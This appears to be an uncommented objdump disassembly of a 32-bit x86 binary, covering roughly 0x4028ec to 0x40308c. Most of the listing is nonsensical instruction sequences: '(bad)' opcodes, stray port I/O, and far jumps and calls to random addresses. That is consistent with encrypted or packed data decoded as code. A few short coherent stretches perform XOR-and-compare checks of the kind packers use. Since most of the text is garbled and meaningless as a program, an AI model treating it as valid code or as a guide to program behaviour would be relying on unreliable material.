  4028ec:	jl     0x4028c0
  4028ee:	push   ebx
  4028ef:	into   
  4028f0:	fadd   DWORD PTR [edx-0x2c]
  4028f3:	in     eax,dx
  4028f4:	(bad)  
  4028f5:	out    dx,al
  4028f6:	rol    DWORD PTR [ebp-0x52ca6d87],0x48
  4028fd:	cmp    eax,0x3751410a
  402902:	dec    BYTE PTR [ebx+0x3f]
  402905:	pop    ecx
  402906:	mov    ecx,0x52fd46b5
  40290b:	pop    ecx
  40290c:	cmp    dl,BYTE PTR [ebp+0x45]
  40290f:	test   al,0x49
  402911:	pop    ss
  402912:	dec    ebp
  402913:	mov    dh,0xdb
  402915:	inc    esi
  402916:	jae    0x4028b4
  402918:	jo     0x40298d
  40291a:	hlt    
  40291b:	pop    esi
  40291c:	es ins DWORD PTR es:[edi],dx
  40291e:	push   0xe
  402920:	cmp    al,0x33
  402922:	and    cl,BYTE PTR [esi+0x7c]
  402925:	mov    ds:0x7f7152b5,al
  40292a:	pop    eax
  40292b:	xchg   BYTE PTR [ebx],dh
  40292d:	push   ecx
  40292e:	stc    
  40292f:	xchg   edx,eax
  402930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402931:	call   0xa632:0x612dba32
  402938:	loope  0x402901
  40293a:	jmp    0x9d937a17
  40293f:	jge    0x4029b1
  402941:	retf   0x65c8
  402944:	push   ss
  402945:	call   0x2ff8:0xd7feb214
  40294c:	mov    ds:0x9ae6ff0,eax
  402951:	jl     0x402982
  402953:	add    ch,BYTE PTR [ecx]
  402955:	pop    ebp
  402956:	ins    BYTE PTR es:[edi],dx
  402957:	xchg   edi,eax
  402958:	clc    
  402959:	inc    eax
  40295a:	cmp    DWORD PTR [ecx+0x5c],edx
  40295d:	in     al,dx
  40295e:	fdivr  QWORD PTR [edi]
  402960:	inc    DWORD PTR [esi+0x66c2ed31]
  402966:	sbb    edx,ebx
  402968:	fisttp QWORD PTR [eax-0x1]
  40296b:	mov    edx,0xe3650a11
  402970:	aas    
  402971:	es imul esp,DWORD PTR gs:[eax-0x23],0x60757267
  40297a:	push   cs
  40297b:	repz popf 
  40297d:	pop    esi
  40297e:	sbb    DWORD PTR [ecx+eax*8+0x42],eax
  402982:	lods   al,BYTE PTR ds:[esi]
  402983:	and    eax,0xbfb6e01b
  402988:	les    esi,FWORD PTR [ebx]
  40298a:	stos   BYTE PTR es:[edi],al
  40298b:	(bad)  
  40298c:	push   edi
  40298d:	iret   
  40298e:	outs   dx,DWORD PTR ds:[esi]
  40298f:	(bad)  
  402990:	xor    eax,0x3883ebc3
  402995:	(bad)  
  402996:	fidivr WORD PTR [eax+ebx*4]
  402999:	cmp    eax,0x8046c9e9
  40299e:	xor    eax,DWORD PTR ds:0x376a78ab
  4029a4:	mov    ecx,0xb5e24355
  4029a9:	out    0x14,eax
  4029ab:	cmp    dh,BYTE PTR cs:[esi+0x3c]
  4029af:	jmp    0x402a0a
  4029b1:	outs   dx,BYTE PTR ds:[esi]
  4029b2:	icebp  
  4029b3:	sub    DWORD PTR [esi+0xb],esi
  4029b6:	or     edx,edx
  4029b8:	push   cs
  4029b9:	pop    ebx
  4029ba:	shl    DWORD PTR [ebx+0xc9e1ec3],0xc6
  4029c1:	pop    es
  4029c2:	cmp    BYTE PTR [edi-0x6],ch
  4029c5:	push   ebx
  4029c6:	jno    0x402992
  4029c8:	test   al,0x4e
  4029ca:	jns    0x402a1e
  4029cc:	es sub al,0xea
  4029cf:	imul   ebp,DWORD PTR [eax],0xffffffc9
  4029d2:	call   ebp
  4029d4:	or     edi,DWORD PTR [ebx+0x43413ae]
  4029da:	test   eax,0xe979a220
  4029df:	add    esp,ecx
  4029e1:	dec    edi
  4029e2:	test   DWORD PTR [eax],ebp
  4029e4:	icebp  
  4029e5:	jns    0x402a1e
  4029e7:	cld    
  4029e8:	das    
  4029e9:	xchg   ecx,eax
  4029ea:	sahf   
  4029eb:	or     al,0x4c
  4029ed:	sahf   
  4029ee:	shl    BYTE PTR [edx+0x1c],cl
  4029f1:	daa    
  4029f2:	pushf  
  4029f3:	stos   BYTE PTR es:[edi],al
  4029f4:	das    
  4029f5:	jmp    DWORD PTR [edx+0x35fabdce]
  4029fb:	xchg   ebp,eax
  4029fc:	jge    0x40297f
  4029fe:	ins    BYTE PTR es:[edi],dx
  4029ff:	xchg   ecx,eax
  402a00:	adc    DWORD PTR [eax+0x6],esp
  402a03:	mov    ds:0x39e196e,eax
  402a08:	sub    BYTE PTR [edx+0x622d865b],cl
  402a0e:	pop    DWORD PTR [edx-0x66]
  402a11:	adc    ecx,DWORD PTR [ebx-0x55]
  402a14:	fldenv [eax+0x79]
  402a17:	add    BYTE PTR [ecx],dh
  402a19:	cmp    eax,0xed1311b2
  402a1e:	cmp    edx,DWORD PTR [edi+0x55]
  402a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a22:	call   0xcdcd:0x1407fa81
  402a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a2a:	jns    0x402a10
  402a2c:	fldenv [esi]
  402a2e:	test   al,0x8e
  402a31:	mov    ebp,0xef1a2443
  402a36:	out    0xb1,al
  402a38:	mov    edx,0x99ddf68a
  402a3d:	icebp  
  402a3e:	xchg   DWORD PTR [ecx+0x741fce23],ebp
  402a44:	xchg   edx,eax
  402a45:	jmp    0xf9f2:0x901b7ea
  402a4c:	inc    eax
  402a4d:	mov    ebp,0x6b119fd4
  402a52:	repnz mov al,0x6
  402a55:	sub    BYTE PTR [edx+0x5a],dl
  402a58:	sbb    al,0x93
  402a5a:	ins    DWORD PTR es:[edi],dx
  402a5b:	sub    eax,0x414ddecb
  402a60:	in     eax,0x49
  402a62:	add    eax,0x8a1443aa
  402a67:	outs   dx,BYTE PTR ds:[esi]
  402a68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a69:	or     ecx,0xffffffb7
  402a6c:	and    dl,bl
  402a6e:	idiv   DWORD PTR [edx]
  402a70:	xchg   esi,esp
  402a72:	sub    ebx,DWORD PTR [edx]
  402a74:	xor    eax,0x9a675982
  402a79:	ss aas 
  402a7b:	popf   
  402a7c:	add    al,0x9f
  402a7e:	aad    0x61
  402a80:	in     al,0x52
  402a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a83:	push   ss
  402a84:	ins    BYTE PTR es:[edi],dx
  402a85:	dec    ebp
  402a86:	add    al,0xb2
  402a88:	pop    edi
  402a89:	adc    al,0x3a
  402a8b:	mov    ah,0x9e
  402a8d:	xor    eax,0x839a0184
  402a92:	std    
  402a93:	ins    BYTE PTR es:[edi],dx
  402a94:	loopne 0x402a33
  402a96:	rcl    DWORD PTR [edx+0x382c6dbd],0x23
  402a9d:	gs sbb eax,0x518c0728
  402aa3:	fdiv   DWORD PTR [edx+0x6a17f7cc]
  402aa9:	mov    es,eax
  402aab:	pop    ds
  402aac:	cmp    eax,0xcbf9de40
  402ab1:	rol    BYTE PTR [eax-0x5bdba63],cl
  402ab7:	add    DWORD PTR [edi],0x943e4392
  402abd:	call   0x162c:0xc33ef0a5
  402ac4:	mov    eax,0xb3d4b307
  402ac9:	fistp  WORD PTR [eax]
  402acb:	dec    ebx
  402acc:	jbe    0x402a8c
  402ace:	outs   dx,DWORD PTR ds:[esi]
  402acf:	fwait
  402ad0:	movd   mm6,ebp
  402ad3:	scas   eax,DWORD PTR es:[edi]
  402ad4:	in     al,0xe0
  402ad6:	pop    edx
  402ad7:	sahf   
  402ad8:	and    DWORD PTR [ebx-0x37],edx
  402adb:	(bad)  
  402adc:	(bad)  
  402add:	push   ebx
  402ade:	push   eax
  402adf:	xchg   edi,eax
  402ae0:	inc    edi
  402ae1:	ins    BYTE PTR es:[edi],dx
  402ae2:	dec    edi
  402ae3:	cli    
  402ae4:	ss or  ebp,ebx
  402ae7:	dec    edi
  402ae8:	dec    edx
  402ae9:	dec    esp
  402aea:	mov    bl,0x22
  402aec:	sub    BYTE PTR [esi+eiz*8],dl
  402aef:	mov    ah,BYTE PTR [eax]
  402af1:	cmp    bh,ah
  402af3:	out    0x1,al
  402af5:	lock (bad) 
  402af7:	in     al,dx
  402af8:	inc    ecx
  402af9:	fisubr WORD PTR [ecx]
  402afb:	adc    BYTE PTR [eax],ch
  402afd:	xchg   edi,eax
  402afe:	or     DWORD PTR [ebx+0x51d05280],0x6f
  402b05:	sbb    DWORD PTR [edx],0xc7a4fa61
  402b0b:	inc    DWORD PTR [ecx]
  402b0d:	cdq    
  402b0e:	dec    ebp
  402b0f:	dec    esi
  402b10:	stc    
  402b11:	push   ds
  402b12:	les    edi,FWORD PTR [ebx+0x22]
  402b15:	or     bl,bh
  402b17:	in     eax,dx
  402b18:	pop    esi
  402b19:	ds arpl bx,bx
  402b1c:	aaa    
  402b1d:	mov    eax,ds:0x3658c02c
  402b22:	test   eax,0x4f96469e
  402b27:	xlat   BYTE PTR ds:[ebx]
  402b28:	clc    
  402b29:	out    dx,al
  402b2a:	(bad)  
  402b2b:	sub    DWORD PTR [ebx-0x7430f0bc],ebp
  402b31:	pusha  
  402b32:	xchg   esp,eax
  402b33:	jp     0x402ac3
  402b35:	mov    ebx,0xb5e68b81
  402b3a:	cmp    BYTE PTR [esi-0xeabf84e],cl
  402b40:	xchg   ecx,eax
  402b41:	add    al,0x11
  402b43:	jecxz  0x402ae9
  402b45:	mov    ecx,0xe39c7e26
  402b4a:	ins    BYTE PTR es:[edi],dx
  402b4b:	push   esp
  402b4c:	shl    BYTE PTR fs:[eax],1
  402b4f:	pop    ebx
  402b50:	push   ss
  402b51:	nop
  402b52:	cs mov al,0x67
  402b55:	jbe    0x402b05
  402b57:	cmp    dh,ch
  402b59:	jns    0x402bb9
  402b5b:	imul   ebx,DWORD PTR [edx],0xffffff90
  402b5e:	scas   al,BYTE PTR es:[edi]
  402b5f:	push   eax
  402b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b61:	lods   eax,DWORD PTR ds:[esi]
  402b62:	sahf   
  402b63:	sbb    bl,BYTE PTR [esi-0x6383c1fb]
  402b69:	jns    0x402be4
  402b6b:	aam    0x5d
  402b6d:	push   ecx
  402b6e:	jns    0x402b7a
  402b70:	fs mov cl,0xcc
  402b73:	nop
  402b74:	jp     0x402bcb
  402b76:	sub    ch,BYTE PTR [esi-0x4b]
  402b79:	sub    al,ah
  402b7b:	fnstenv [eax-0x250ba886]
  402b81:	add    BYTE PTR [edx],bh
  402b83:	bnd je 0x402b41
  402b86:	test   al,0xc7
  402b88:	arpl   WORD PTR [eax-0x4d],bp
  402b8b:	in     eax,0xb8
  402b8d:	pop    esp
  402b8e:	push   ss
  402b8f:	bound  edi,QWORD PTR [esp+ebp*4-0x34348865]
  402b96:	add    al,ch
  402b98:	jne    0x402b3c
  402b9a:	clc    
  402b9b:	lahf   
  402b9c:	shl    BYTE PTR [ebx+0x3e7fb1a4],cl
  402ba2:	and    DWORD PTR [edx-0x7ce52612],ecx
  402ba8:	(bad)  
  402ba9:	and    ecx,DWORD PTR [edx]
  402bab:	loope  0x402b91
  402bad:	loope  0x402ba9
  402baf:	mov    ch,0x70
  402bb1:	in     eax,dx
  402bb2:	shl    ebx,cl
  402bb4:	xor    BYTE PTR [edi+0x73],al
  402bb7:	mov    ah,bh
  402bb9:	pop    ebp
  402bba:	mov    ch,0x80
  402bbc:	(bad)  
  402bbd:	push   eax
  402bbe:	jae    0x402c32
  402bc0:	in     eax,0x5c
  402bc2:	jbe    0x402bdc
  402bc4:	fbstp  TBYTE PTR [esp+eax*4]
  402bc7:	sbb    al,0xd4
  402bc9:	imul   edi,DWORD PTR [edi+0x2fbf343a],0xffffff8c
  402bd0:	mov    ds:0x88728387,al
  402bd5:	js     0x402b62
  402bd7:	inc    eax
  402bd8:	cmp    al,0x8d
  402bda:	or     al,0xcd
  402bdc:	js     0x402bde
  402bde:	add    BYTE PTR [eax],al
  402be0:	add    eax,ecx
  402be2:	mov    ecx,DWORD PTR [ebp-0x8]
  402be5:	mov    ecx,DWORD PTR [ecx]
  402be7:	mov    eax,DWORD PTR [eax+ecx*1]
  402bea:	mov    DWORD PTR [ebp-0x1c],eax
  402bed:	mov    eax,DWORD PTR [ebp+0x8]
  402bf0:	xor    eax,esi
  402bf2:	add    eax,edi
  402bf4:	mov    DWORD PTR [ebp-0x20],eax
  402bf7:	mov    eax,DWORD PTR [ebp+0x8]
  402bfa:	mov    ecx,DWORD PTR [ebp-0x1c]
  402bfd:	xor    eax,esi
  402bff:	add    eax,edi
  402c01:	cmp    ecx,eax
  402c03:	je     0x402f69
  402c09:	mov    eax,DWORD PTR [ebp-0x8]
  402c0c:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c0f:	add    ecx,DWORD PTR [eax]
  402c11:	mov    DWORD PTR [ebp-0x20],ecx
  402c14:	mov    eax,DWORD PTR [ebp-0x20]
  402c17:	mov    ecx,DWORD PTR [ebp-0x8]
  402c1a:	mov    eax,DWORD PTR [eax+0xc]
  402c1d:	mov    ecx,DWORD PTR [ecx]
  402c1f:	mov    al,BYTE PTR [eax+ecx*1]
  402c22:	add    al,0x39
  402c24:	xor    al,0x45
  402c26:	cmp    al,0xc1
  402c28:	je     0x402c3f
  402c2e:	mov    eax,DWORD PTR [ebp+0x8]
  402c31:	mov    ecx,DWORD PTR [ebp-0x8]
  402c34:	xor    eax,esi
  402c36:	add    eax,edi
  402c38:	mov    DWORD PTR [ecx],eax
  402c3a:	jmp    0x402f69
  402c3f:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  402c46:	jmp    0x402f69
  402c4b:	mov    eax,DWORD PTR [ebp-0x8]
  402c4e:	mov    ecx,DWORD PTR [ebp-0x18]
  402c51:	mov    ecx,DWORD PTR [ecx]
  402c53:	mov    DWORD PTR [eax],ecx
  402c55:	mov    eax,DWORD PTR [ebp+0xc]
  402c58:	mov    eax,DWORD PTR [ebp+0x8]
  402c5b:	jmp    0x402f61
  402c60:	add    al,0x8f
  402c62:	and    ecx,0xffffff93
  402c65:	std    
  402c66:	bound  ebp,QWORD PTR [ecx-0x45]
  402c69:	or     DWORD PTR [edi+0x5d],eax
  402c6c:	ret    
  402c6d:	push   ebp
  402c6e:	or     ch,BYTE PTR [eax-0x3c]
  402c71:	adc    eax,0x7e677c7c
  402c76:	jl     0x402cf4
  402c78:	sbb    eax,0xbb1ba735
  402c7d:	mov    esp,0x9ddcf2b
  402c82:	push   ebx
  402c83:	pusha  
  402c84:	mov    dh,0xc1
  402c86:	inc    eax
  402c87:	xchg   esp,eax
  402c88:	sti    
  402c89:	dec    ebp
  402c8a:	test   BYTE PTR gs:[ebp+0x4549944a],dh
  402c91:	retf   
  402c92:	frstor [ebx-0x55]
  402c95:	out    dx,eax
  402c96:	cld    
  402c97:	jecxz  0x402cfb
  402c99:	cmp    al,0xe2
  402c9b:	adc    eax,0xea50df77
  402ca0:	mov    BYTE PTR [eax+0x77],dl
  402ca3:	loopne 0x402cd5
  402ca5:	and    ch,BYTE PTR [ebp+0x10]
  402ca8:	ins    DWORD PTR es:[edi],dx
  402ca9:	fnstsw WORD PTR [edi+edi*8+0x44433db6]
  402cb0:	es (bad) 
  402cb2:	and    edx,DWORD PTR [eax+0x4e3cfde5]
  402cb8:	xor    ebx,DWORD PTR [eax]
  402cba:	jne    0x402d2e
  402cbc:	lds    ecx,FWORD PTR [ecx]
  402cbe:	lods   al,BYTE PTR ds:[esi]
  402cbf:	jne    0x402c90
  402cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cc2:	xchg   esp,eax
  402cc3:	dec    ebp
  402cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cc5:	jmp    0xf17fa9f3
  402cca:	adc    ah,BYTE PTR [edi]
  402ccc:	and    edi,DWORD PTR [ecx-0x392156ee]
  402cd2:	not    BYTE PTR [esi]
  402cd4:	addr16 cdq 
  402cd6:	test   al,0x1a
  402cd8:	jns    0x402cd3
  402cda:	xchg   DWORD PTR [eax-0x78186f38],esp
  402ce0:	mov    esi,0x44f2a33b
  402ce5:	xchg   DWORD PTR [ebx],ecx
  402ce7:	js     0x402d65
  402ce9:	push   esi
  402cea:	or     edi,0x18
  402ced:	(bad)  
  402cee:	(bad)  
  402cef:	ret    0x2fb4
  402cf2:	dec    esi
  402cf3:	rcl    DWORD PTR [ecx+0x13],0xf7
  402cf7:	pop    ebp
  402cf8:	lods   al,BYTE PTR ds:[esi]
  402cf9:	jb     0x402cc9
  402cfb:	inc    ecx
  402cfc:	dec    edx
  402cfd:	shr    DWORD PTR [ebp+0x36a10ec4],0xb7
  402d04:	push   ds
  402d05:	imul   eax,ebx,0x1356bd33
  402d0b:	mov    esi,0x1b0b6f55
  402d10:	les    ebp,FWORD PTR [esi]
  402d12:	loope  0x402ca8
  402d14:	ret    
  402d15:	lea    ebx,[edx]
  402d17:	retf   0xcb48
  402d1a:	in     al,0x8b
  402d1c:	ja     0x402cb0
  402d1e:	(bad)
  402d22:	mov    eax,0x29ec6799
  402d27:	outs   dx,BYTE PTR ds:[esi]
  402d28:	add    esp,eax
  402d2a:	out    dx,al
  402d2b:	ins    DWORD PTR es:[edi],dx
  402d2c:	sbb    dh,BYTE PTR [eax+0x631ef305]
  402d32:	iret   
  402d33:	cmp    al,0xe4
  402d35:	(bad)  
  402d36:	imul   edi,DWORD PTR [edi+0x35],0xfffffffb
  402d3a:	clc    
  402d3b:	and    bh,BYTE PTR [ecx*1+0x454dd7b8]
  402d42:	jle    0x402d3c
  402d44:	push   eax
  402d45:	push   eax
  402d46:	jp     0x402d64
  402d48:	pop    edx
  402d49:	icebp  
  402d4a:	and    ebp,edi
  402d4c:	cwde   
  402d4d:	fisubr DWORD PTR [ebx-0x67007caf]
  402d53:	out    dx,al
  402d54:	push   0x3a4e7a21
  402d59:	mov    ds:0xce1aad24,al
  402d5e:	fcomi  st,st(7)
  402d60:	daa    
  402d61:	out    0x1a,al
  402d63:	data16 fs lock cld 
  402d67:	jmp    0x4411:0xb6391c14
  402d6e:	out    0xa5,eax
  402d70:	mov    bl,BYTE PTR [eax]
  402d72:	mov    ?,edx
  402d74:	and    al,0x36
  402d76:	fwait
  402d77:	jne    0x402d36
  402d79:	cli    
  402d7a:	out    0xcd,eax
  402d7c:	mov    al,0x3f
  402d7e:	js     0x402d66
  402d80:	jge    0x402d4c
  402d82:	and    al,0xb1
  402d84:	mov    edi,0xa15aca98
  402d89:	add    ah,BYTE PTR [esi-0x25]
  402d8c:	(bad)  
  402d8d:	not    BYTE PTR [ecx+0x588f8a6d]
  402d93:	dec    ebx
  402d94:	cmp    DWORD PTR [ebp+ebx*1-0x54],ecx
  402d98:	(bad)  
  402d99:	mov    ebx,0xd3ca2e02
  402d9e:	mov    BYTE PTR [ecx-0x451b6f09],al
  402da4:	cdq    
  402da5:	cmp    DWORD PTR [esi-0x1c3d5d21],ebx
  402dab:	inc    esi
  402dac:	jecxz  0x402e0b
  402dae:	mov    eax,0x4f47c742
  402db3:	inc    edx
  402db4:	jge    0x402d7f
  402db6:	bound  ebp,QWORD PTR [esp+esi*2]
  402db9:	das    
  402dba:	jne    0x402db6
  402dbc:	push   edi
  402dbd:	jno    0x402e05
  402dbf:	pop    ss
  402dc0:	mov    dl,0x9e
  402dc2:	fst    DWORD PTR [eax+edi*4-0x5f93e8af]
  402dc9:	mov    ds:0xd4ef2cb4,al
  402dce:	loope  0x402de2
  402dd0:	es scas al,BYTE PTR es:[edi]
  402dd2:	es xchg esi,eax
  402dd4:	sub    al,0x23
  402dd6:	xchg   ecx,eax
  402dd7:	das    
  402dd8:	dec    esp
  402dd9:	xor    bl,BYTE PTR [edx+ebx*4]
  402ddc:	sub    edx,DWORD PTR [ebp+esi*2-0x8]
  402de0:	je     0x402e44
  402de2:	cmp    esp,DWORD PTR [edx+0x6b8b5d37]
  402de8:	push   es
  402de9:	in     eax,dx
  402dea:	imul   ebx
  402dec:	or     edi,DWORD PTR [ebx+0xf326e17]
  402df2:	push   ebx
  402df3:	adc    edx,DWORD PTR [ecx-0x6]
  402df6:	pop    esp
  402df7:	out    0x29,eax
  402df9:	xlat   BYTE PTR ds:[ebx]
  402dfa:	vorps  ymm6,ymm5,YMMWORD PTR [eax]
  402dfe:	or     eax,0x65bdb2ad
  402e03:	and    BYTE PTR [edx+0x34d6e9fc],ah
  402e09:	xlat   BYTE PTR ds:[ebx]
  402e0a:	jbe    0x402dde
  402e0c:	push   esi
  402e0d:	mov    edi,0x3ec77b9
  402e12:	push   ds
  402e13:	dec    esp
  402e14:	inc    ecx
  402e15:	hlt    
  402e16:	hlt    
  402e17:	lock bound eax,QWORD PTR [edx]
  402e1a:	sbb    DWORD PTR [ecx],edi
  402e1c:	push   ss
  402e1d:	fwait
  402e1e:	loope  0x402e54
  402e20:	or     DWORD PTR [edx+0x7694851f],ecx
  402e26:	leave  
  402e27:	add    DWORD PTR [eax-0x21019b33],0xffffffce
  402e2e:	cmp    al,0xa9
  402e30:	imul   ebx,DWORD PTR [esi+0x8],0xf6f5ab54
  402e37:	mov    ah,0x5d
  402e39:	inc    ebx
  402e3a:	imul   eax,DWORD PTR ds:0xad83125d,0xffffffa8
  402e41:	retf   0xe356
  402e44:	and    ebx,edx
  402e46:	imul   esp,DWORD PTR [ebx],0xffffffea
  402e49:	dec    esp
  402e4a:	fst    st(1)
  402e4c:	sub    ch,BYTE PTR [ecx+esi*4]
  402e4f:	xchg   esp,eax
  402e50:	loope  0x402df1
  402e52:	xor    eax,0x552cf055
  402e57:	sub    dl,BYTE PTR [edx+0x3d800039]
  402e5d:	push   ebx
  402e5e:	clc    
  402e5f:	dec    esi
  402e60:	lods   eax,DWORD PTR ds:[esi]
  402e61:	push   0x2
  402e63:	and    dh,BYTE PTR es:[ebx]
  402e66:	xor    esp,edi
  402e68:	mov    ah,BYTE PTR [edi]
  402e6a:	mul    BYTE PTR [ebp-0x4fd723e9]
  402e70:	inc    edx
  402e71:	adc    DWORD PTR [ebx+0x2b08efb9],ebp
  402e77:	lahf   
  402e78:	fwait
  402e79:	xchg   BYTE PTR [eax],bh
  402e7b:	inc    esi
  402e7c:	cmp    BYTE PTR [edx+0x6a],cl
  402e7f:	mov    ch,0xa4
  402e81:	mov    ah,0xf9
  402e83:	xchg   esi,eax
  402e84:	jecxz  0x402edd
  402e86:	hlt    
  402e87:	adc    esi,DWORD PTR [edx-0x5af19dfb]
  402e8d:	cli    
  402e8e:	add    ebp,ebp
  402e90:	pop    esi
  402e91:	sbb    ecx,DWORD PTR ds:0x32986e24
  402e97:	adc    cl,dl
  402e99:	push   ebx
  402e9a:	mov    DWORD PTR [edx+0x495e5908],ecx
  402ea0:	pop    edx
  402ea1:	sub    ch,0x35
  402ea4:	fimul  WORD PTR [edx+0x2e]
  402ea7:	cmp    bh,BYTE PTR [ecx+0x520d526a]
  402ead:	xor    eax,0x9f31ade6
  402eb2:	retf   
  402eb3:	jb     0x402efd
  402eb5:	(bad)  
  402eb7:	mov    eax,ds:0x68d12e1b
  402ebc:	push   cs
  402ebd:	mov    ds:0x383a0558,eax
  402ec2:	loop   0x402eab
  402ec4:	inc    edx
  402ec5:	inc    esp
  402ec6:	xchg   ecx,eax
  402ec7:	adc    cl,BYTE PTR [ebx-0x67]
  402eca:	cli    
  402ecb:	retf   
  402ecc:	jmp    0x841a:0x9d51abd
  402ed3:	push   ebp
  402ed4:	call   0x71dac7ef
  402ed9:	aaa    
  402eda:	daa    
  402edb:	xor    eax,0xaa9cd89b
  402ee0:	mov    es:0x5ac029aa,al
  402ee6:	(bad)  
  402ee7:	mov    edi,0x99eafd12
  402eec:	add    BYTE PTR [edx+0x45ac4704],0xf6
  402ef3:	push   ebx
  402ef4:	or     DWORD PTR [eax],eax
  402ef6:	dec    ebx
  402ef7:	lods   eax,DWORD PTR ds:[esi]
  402ef8:	dec    esi
  402ef9:	push   ebx
  402efa:	clc    
  402efb:	push   ebp
  402efc:	pop    ecx
  402efd:	mov    WORD PTR [ebx-0x7d6a0c55],cs
  402f03:	call   0xaa0470f5
  402f08:	sub    DWORD PTR [eax-0x6a],ecx
  402f0b:	sub    eax,0x1a9424e8
  402f10:	pop    ds
  402f11:	adc    DWORD PTR [edi],edx
  402f13:	cli    
  402f14:	mov    bh,BYTE PTR [ebx]
  402f16:	scas   al,BYTE PTR es:[edi]
  402f17:	inc    edx
  402f18:	stc    
  402f19:	loop   0x402f8e
  402f1b:	test   eax,0xdf06f131
  402f20:	sub    DWORD PTR [eax-0xe618642],ebx
  402f26:	dec    edi
  402f27:	fsub   DWORD PTR [ecx-0x50]
  402f2a:	cmp    eax,0x590f51fa
  402f2f:	mov    ds:0xae088941,al
  402f34:	and    DWORD PTR [esi],esp
  402f36:	adc    al,0x71
  402f38:	jo     0x402f16
  402f3a:	das    
  402f3b:	push   ebx
  402f3c:	push   esi
  402f3d:	mov    cl,0x84
  402f3f:	inc    ebx
  402f40:	jmp    0xbb6d987a
  402f45:	das    
  402f46:	jl     0x402fb8
  402f48:	adc    esp,DWORD PTR [ebp-0x294ecb01]
  402f4e:	rcl    DWORD PTR [ecx],0xe2
  402f51:	test   eax,0xb17869e0
  402f56:	fdiv   st(4),st
  402f58:	xchg   ebx,eax
  402f59:	std    
  402f5a:	mov    cl,0x8a
  402f5c:	push   ds
  402f5d:	mov    esp,0xff036c54
  402f62:	jne    0x402f5c
  402f64:	call   0x4062cd
  402f69:	mov    eax,DWORD PTR [ebp-0xc]
  402f6c:	cmp    eax,ebx
  402f6e:	je     0x401817
  402f74:	mov    eax,DWORD PTR [ebp-0x8]
  402f77:	mov    eax,DWORD PTR [eax]
  402f79:	pop    edi
  402f7a:	pop    esi
  402f7b:	jmp    0x403281
  402f80:	imul   ebx,DWORD PTR [eax],0x54
  402f83:	cmc    
  402f84:	push   edi
  402f85:	jge    0x403004
  402f87:	call   0x6333:0x1360eb95
  402f8e:	pop    esp
  402f8f:	jl     0x402fc0
  402f91:	push   ss
  402f92:	jl     0x403010
  402f94:	addr16 jle 0x403013
  402f97:	jl     0x403002
  402f99:	mov    esi,0xe77c2a21
  402f9e:	mov    cs:0xdb13578e,al
  402fa4:	mov    ds:0xbac6795f,eax
  402fa9:	in     al,dx
  402faa:	(bad)  
  402fab:	fidiv  DWORD PTR [edx+0xfd48ebe]
  402fb1:	mov    bh,0xeb
  402fb3:	gs inc ebx
  402fb5:	popa   
  402fb6:	aam    0xd8
  402fb8:	lds    eax,FWORD PTR [esi]
  402fba:	je     0x402f40
  402fbc:	inc    esp
  402fbd:	xor    BYTE PTR [esi],al
  402fbf:	cwde   
  402fc0:	push   eax
  402fc1:	data16 aad 0x1c
  402fc4:	imul   edx,esi,0xffffff99
  402fc7:	mov    WORD PTR [ebx+0x4f75f65e],gs
  402fcd:	loopne 0x402f67
  402fcf:	sub    bl,BYTE PTR [ebx-0x6d]
  402fd2:	push   esp
  402fd3:	pop    es
  402fd4:	jns    0x403032
  402fd6:	loop   0x402f7a
  402fd8:	inc    ebx
  402fd9:	js     0x403036
  402fdb:	xchg   esp,eax
  402fdc:	dec    ebp
  402fdd:	sbb    BYTE PTR [ebx],bl
  402fdf:	pop    ds
  402fe0:	add    edi,DWORD PTR [eax-0xd]
  402fe3:	outs   dx,BYTE PTR ds:[esi]
  402fe4:	aaa    
  402fe5:	lods   al,BYTE PTR ds:[esi]
  402fe6:	cmp    BYTE PTR [edi-0x52],dh
  402fe9:	add    al,0x25
  402feb:	div    ch
  402fed:	nop
  402fee:	add    edi,ebx
  402ff0:	xchg   edi,eax
  402ff1:	(bad)  
  402ff2:	loope  0x403006
  402ff4:	pop    ss
  402ff5:	add    DWORD PTR ds:0x40cb8358,ecx
  402ffb:	or     dl,bl
  402ffd:	and    BYTE PTR [ecx-0x1dd93a15],ah
  403003:	or     DWORD PTR [ebx+0x364b6d73],edi
  403009:	aaa    
  40300a:	adc    ecx,DWORD PTR [esp+ecx*8+0x529f1278]
  403011:	mov    bh,0x1a
  403013:	sahf   
  403014:	arpl   bx,cx
  403016:	clc    
  403017:	dec    edx
  403018:	dec    edi
  403019:	stos   BYTE PTR es:[edi],al
  40301a:	push   edx
  40301b:	push   ds
  40301c:	ret    
  40301d:	cmp    al,0xbb
  40301f:	arpl   WORD PTR [eax+0x4d9177b5],dx
  403025:	outs   dx,DWORD PTR ds:[esi]
  403026:	out    0x3a,eax
  403028:	div    BYTE PTR [edi+ebx*1]
  40302b:	and    edx,ebp
  40302d:	into   
  40302e:	scas   eax,DWORD PTR es:[edi]
  40302f:	int3   
  403030:	mov    eax,ds:0xd23cf33d
  403035:	jbe    0x403092
  403037:	ret    
  403038:	mov    es,edi
  40303a:	or     eax,0xbf19fc2a
  40303f:	cmp    al,0x12
  403041:	mov    WORD PTR [edx],ss
  403043:	inc    ecx
  403044:	jmp    0x403073
  403046:	imul   ecx,eax,0x4d
  403049:	sub    ebx,DWORD PTR [ebx]
  40304b:	mov    ebp,0xf940f4eb
  403050:	fwait
  403051:	add    DWORD PTR [edx-0x44],0x95fc656d
  403058:	inc    esi
  403059:	inc    edi
  40305a:	jg     0x40307f
  40305c:	aad    0x13
  40305e:	cmp    BYTE PTR [edi+0x28806eed],0x74
  403065:	rol    DWORD PTR [ebx],1
  403067:	push   0x4c5465ea
  40306c:	adc    BYTE PTR [ebx],ch
  40306e:	mov    dh,0x8
  403070:	adc    al,0xcc
  403072:	repnz sbb DWORD PTR [ecx+0x3d626e09],esi
  403079:	ins    DWORD PTR es:[edi],dx
  40307a:	dec    ebx
  40307b:	imul   ebx,DWORD PTR [edi+0x33],0xffffffc9
  40307f:	add    eax,0x2a324909
  403084:	jmp    0xfa5e:0x81faaa13
  40308b:	pop    ebx
  40308c:	sbb    esp,esi
